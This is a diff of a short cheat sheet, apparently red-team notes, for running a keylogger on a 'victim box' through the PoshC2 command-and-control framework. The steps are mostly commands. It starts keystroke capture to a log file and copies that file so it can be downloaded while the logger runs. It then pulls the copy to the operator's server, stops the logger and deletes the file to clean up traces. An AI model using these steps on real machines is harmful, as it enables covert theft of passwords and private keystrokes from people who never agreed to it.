@@ -12,18 +12,24 @@ start-keystrokes
 ##Starts the Keylogger(realtime on poshc2 Server)
 
 start-keystrokes-writefile 
-##record this file location(.log) this in on victim box
+##record this filelocation(.log) this in on victim box
 
 ### Keylogger is now running until Stopped ### Typically used if keylogger is being ran over a set time"
 
-Download-file "C:\keylogname.log" 
+
+copy "fileLocation(.log)" "Sameplace newname(.log)"
+#make a copy to download after the logger has been running
+
+Download-file "path of newname.log" 
 ## Gets put into /var/poshc2/*projectname*/downloads
 
 Stop-Keystrokes 
 ##Stop keylogger for cleanup
 
-posh-delete C:\<same place with new filename> 
+posh-delete C:\<same place new filename> 
 ##Cleaning up file created
+
+#you cant delete the original filelocation if the implant is still up. will get file in use error.
 ```
 ---
 
